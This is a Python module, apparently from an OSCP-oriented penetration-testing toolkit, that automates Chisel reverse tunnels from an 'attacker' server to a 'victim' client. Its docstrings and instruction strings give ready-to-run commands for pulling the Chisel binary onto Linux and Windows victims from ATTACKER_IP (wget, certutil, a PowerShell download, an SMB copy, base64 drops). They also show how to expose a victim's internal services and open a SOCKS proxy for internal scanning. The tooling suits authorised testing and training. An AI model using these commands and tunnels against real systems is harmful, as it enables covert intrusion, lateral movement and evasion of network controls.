"""
Chisel tunnel implementation.

Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH.
Use when SSH is not available or blocked. Single Go binary, easy to transfer.

GitHub: https://github.com/jpillora/chisel
"""

import subprocess
import time
import socket
from typing import Optional
from pathlib import Path

from .models import Tunnel, TunnelConfig
from ..models import Session


class ChiselTunnel:
    """Chisel tunnel management (HTTP-based tunneling).

    Chisel provides TCP/UDP tunneling over HTTP. Easier than SSH when:
    - SSH port is blocked/filtered
    - No SSH credentials available
    - HTTP/HTTPS outbound allowed
    - Need lightweight solution (single binary)

    Architecture:
        Server (attacker): chisel server --reverse --port 8000
        Client (victim):   chisel client <server>:8000 R:8080:localhost:80

    Tunnel Types:
        Reverse tunnels (--reverse on server):
            R:<remote>:<local> - Remote port on server forwards to local on client
            R:socks            - SOCKS proxy on server through client

        Forward tunnels:
            <local>:<remote> - Local port on client forwards to remote through server
            socks            - SOCKS proxy on client through server

    Example:
        >>> from sessions.models import Session
        >>> from sessions.tunnel.chisel import ChiselTunnel
        >>>
        >>> session = Session(target='192.168.45.150', port=22)
        >>> chisel = ChiselTunnel(session)
        >>>
        >>> # Start server on attacker box
        >>> tunnel = chisel.start_server(port=8000, reverse=True)
        >>> print("Server running on port 8000")
        >>>
        >>> # Generate client command for victim
        >>> client_cmd = chisel.connect_client(
        ...     server_url='http://192.168.45.150:8000',
        ...     tunnel_spec='R:8080:localhost:80'
        ... )
        >>> print(f"Run on victim: {client_cmd}")
        >>>
        >>> # Now attacker can access:
        >>> # curl http://localhost:8080  (victim's localhost:80)
    """

    def __init__(self, session: Session, chisel_path: Path = None):
        """Initialize Chisel tunnel handler.

        Args:
            session: Session instance with target information
            chisel_path: Path to chisel binary (default: searches PATH)

        Example:
            >>> # Auto-detect chisel in PATH
            >>> chisel = ChiselTunnel(session)
            >>>
            >>> # Custom chisel binary
            >>> chisel = ChiselTunnel(session, chisel_path=Path('/opt/chisel/chisel'))
        """
        self.session = session
        self.chisel_path = chisel_path or self._find_chisel()
        self.server_process: Optional[subprocess.Popen] = None
        self.current_tunnel: Optional[Tunnel] = None

        if not self.chisel_path:
            raise RuntimeError("Chisel binary not found. Install from: https://github.com/jpillora/chisel")

    def start_server(self, port: int = 8000, reverse: bool = True,
                    socks5: bool = False, auth: str = None,
                    bind_address: str = '0.0.0.0') -> Tunnel:
        """Start chisel server on attacker machine.

        The server accepts connections from chisel clients and manages tunnels.

        Command:
            chisel server --reverse --port 8000

        Flags:
            --reverse: Allow reverse tunnels (victim -> attacker) [RECOMMENDED]
            --socks5: Enable SOCKS5 proxy
            --auth: Authentication (user:pass format)
            --host: Bind address (default: 0.0.0.0)

        Use Case:
            Start server on attacker box to accept client connections from victim.
            Reverse mode (--reverse) allows victim to expose services to attacker.

        Args:
            port: Server port (default: 8000)
            reverse: Allow reverse tunnels (default: True)
            socks5: Enable SOCKS5 proxy (default: False)
            auth: Authentication string 'user:pass' (optional)
            bind_address: Bind address (default: 0.0.0.0)

        Returns:
            Tunnel instance

        Raises:
            RuntimeError: If server fails to start

        Example:
            >>> # Start reverse tunnel server
            >>> tunnel = chisel.start_server(port=8000, reverse=True)
            >>> print(f"[+] Chisel server started on port 8000")
            >>> print(f"[*] Run on victim: {chisel.connect_client('http://attacker:8000', 'R:8080:localhost:80')}")
            >>>
            >>> # Start with authentication
            >>> tunnel = chisel.start_server(port=8000, reverse=True, auth='user:SecurePass123')
            >>>
            >>> # Start SOCKS5 server
            >>> tunnel = chisel.start_server(port=8000, socks5=True)

        Manual Alternative (OSCP):
            If chisel fails, fall back to SSH tunneling or socat relays.
            Chisel is often easier when HTTP egress allowed but SSH blocked.
        """
        cmd = [str(self.chisel_path), 'server', '--port', str(port), '--host', bind_address]

        if reverse:
            cmd.append('--reverse')

        if socks5:
            cmd.append('--socks5')

        if auth:
            cmd.extend(['--auth', auth])

        # Create tunnel object
        config = TunnelConfig(
            server_port=port,
            reverse=reverse,
            extra_args=['--socks5'] if socks5 else []
        )

        tunnel = Tunnel(
            type='chisel',
            session_id=self.session.id if self.session else None,
            target='0.0.0.0',  # Server listens on all interfaces
            config=config,
            status='starting',
            command=' '.join(cmd),
            metadata={'role': 'server', 'auth': bool(auth)}
        )

        # Start server process
        try:
            self.server_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )

            tunnel.pid = self.server_process.pid

            # Give server time to start
            time.sleep(2)

            # Validate server is running
            if self.server_process.poll() is None:
                # Check if port is listening
                if self._is_port_listening(port):
                    tunnel.mark_active()
                    print(f"[+] Chisel server started on {bind_address}:{port}")
                    if reverse:
                        print(f"[*] Reverse mode enabled (client can expose services)")
                else:
                    raise RuntimeError(f"Server started but port {port} not listening")
            else:
                stderr = self.server_process.stderr.read().decode('utf-8', errors='ignore')
                tunnel.mark_error(f"Server process died: {stderr}")
                raise RuntimeError(f"Chisel server failed: {stderr}")

            self.current_tunnel = tunnel
            return tunnel

        except Exception as e:
            tunnel.mark_error(str(e))
            raise RuntimeError(f"Failed to start chisel server: {e}")

    def connect_client(self, server_url: str, tunnel_spec: str,
                      auth: str = None, fingerprint: str = None) -> str:
        """Generate chisel client command for victim.

        This generates the command to run on the victim machine.
        You must execute this command manually on the victim.

        Command:
            chisel client <server_url> <tunnel_spec>

        Tunnel Specs (when server has --reverse):
            R:8080:localhost:80         - Victim's localhost:80 -> Attacker's 0.0.0.0:8080
            R:3306:192.168.1.10:3306    - Victim's internal DB -> Attacker's 0.0.0.0:3306
            R:socks                     - SOCKS proxy on attacker through victim

        Tunnel Specs (forward mode):
            8080:localhost:80           - Attacker's localhost:80 -> Victim's localhost:8080
            socks                       - SOCKS proxy on victim through attacker

        Args:
            server_url: Chisel server URL (http://attacker_ip:port)
            tunnel_spec: Tunnel specification (see above)
            auth: Authentication string 'user:pass' (optional)
            fingerprint: Server fingerprint for verification (optional)

        Returns:
            Command string to run on victim

        Example:
            >>> # Expose victim's localhost:80 to attacker's 8080
            >>> cmd = chisel.connect_client(
            ...     server_url='http://192.168.45.150:8000',
            ...     tunnel_spec='R:8080:localhost:80'
            ... )
            >>> print(cmd)
            'chisel client http://192.168.45.150:8000 R:8080:localhost:80'
            >>>
            >>> # Expose victim's internal MySQL to attacker
            >>> cmd = chisel.connect_client(
            ...     server_url='http://192.168.45.150:8000',
            ...     tunnel_spec='R:3306:192.168.1.10:3306'
            ... )
            >>> # Attacker can now: mysql -h 127.0.0.1 -P 3306
            >>>
            >>> # Create SOCKS proxy through victim
            >>> cmd = chisel.connect_client(
            ...     server_url='http://192.168.45.150:8000',
            ...     tunnel_spec='R:socks'
            ... )
            >>> # Attacker can now: proxychains nmap 192.168.1.0/24

        OSCP Delivery Methods:
            1. Web server: python3 -m http.server 80
               victim$ wget http://attacker/chisel && chmod +x chisel
            2. Base64 encode: cat chisel | base64 -w0
               victim$ echo "<base64>" | base64 -d > chisel && chmod +x chisel
            3. SMB share: impacket-smbserver share . -smb2support
               victim$ copy \\\\attacker\\share\\chisel.exe C:\\chisel.exe
        """
        cmd_parts = [str(self.chisel_path), 'client']

        if auth:
            cmd_parts.extend(['--auth', auth])

        if fingerprint:
            cmd_parts.extend(['--fingerprint', fingerprint])

        cmd_parts.append(server_url)
        cmd_parts.append(tunnel_spec)

        return ' '.join(cmd_parts)

    def stop_server(self):
        """Stop chisel server and cleanup."""
        if self.server_process:
            try:
                self.server_process.terminate()
                self.server_process.wait(timeout=5)
                print("[+] Chisel server stopped")
            except subprocess.TimeoutExpired:
                self.server_process.kill()
                print("[!] Chisel server killed (timeout)")
            finally:
                self.server_process = None

        if self.current_tunnel:
            self.current_tunnel.mark_dead('Server stopped by user')
            self.current_tunnel = None

    def get_transfer_instructions(self, platform: str = 'linux') -> str:
        """Get instructions for transferring chisel to victim.

        Args:
            platform: Target platform ('linux', 'windows')

        Returns:
            Transfer instructions as formatted string

        Example:
            >>> print(chisel.get_transfer_instructions('linux'))
            >>> print(chisel.get_transfer_instructions('windows'))
        """
        instructions = {
            'linux': """
=== Transfer Chisel to Linux Victim ===

1. HTTP Download (Python SimpleHTTPServer):
   attacker$ python3 -m http.server 80
   victim$ wget http://ATTACKER_IP/chisel -O /tmp/chisel && chmod +x /tmp/chisel

2. Base64 Transfer (if no direct download):
   attacker$ cat chisel | base64 -w0 | xclip -selection clipboard
   victim$ echo "PASTE_BASE64" | base64 -d > /tmp/chisel && chmod +x /tmp/chisel

3. SCP Transfer (if SSH available):
   attacker$ scp chisel user@victim:/tmp/chisel
   victim$ chmod +x /tmp/chisel

4. Existing Web Shell:
   Upload via web shell file upload functionality

Download Chisel:
   wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
   gunzip chisel_1.9.1_linux_amd64.gz
   chmod +x chisel_1.9.1_linux_amd64
""",
            'windows': """
=== Transfer Chisel to Windows Victim ===

1. HTTP Download (Python SimpleHTTPServer):
   attacker$ python3 -m http.server 80
   victim> certutil -urlcache -f http://ATTACKER_IP/chisel.exe C:\\Windows\\Temp\\chisel.exe

2. SMB Transfer (Impacket):
   attacker$ impacket-smbserver share . -smb2support
   victim> copy \\\\ATTACKER_IP\\share\\chisel.exe C:\\Windows\\Temp\\chisel.exe

3. PowerShell Download:
   victim> powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP/chisel.exe','C:\\Windows\\Temp\\chisel.exe')"

4. Base64 Transfer (small files):
   attacker$ cat chisel.exe | base64 -w0
   victim> [System.IO.File]::WriteAllBytes("C:\\chisel.exe", [System.Convert]::FromBase64String("PASTE_BASE64"))

Download Chisel:
   wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
   gunzip chisel_1.9.1_windows_amd64.gz
"""
        }

        return instructions.get(platform, instructions['linux'])

    def _find_chisel(self) -> Optional[Path]:
        """Find chisel binary in PATH.

        Returns:
            Path to chisel binary, or None if not found
        """
        import shutil
        chisel_path = shutil.which('chisel')
        return Path(chisel_path) if chisel_path else None

    def _is_port_listening(self, port: int) -> bool:
        """Check if port is listening.

        Args:
            port: Port to check

        Returns:
            True if port is listening
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex(('127.0.0.1', port))
            sock.close()
            return result == 0
        except Exception:
            return False

    def __del__(self):
        """Cleanup on deletion."""
        self.stop_server()
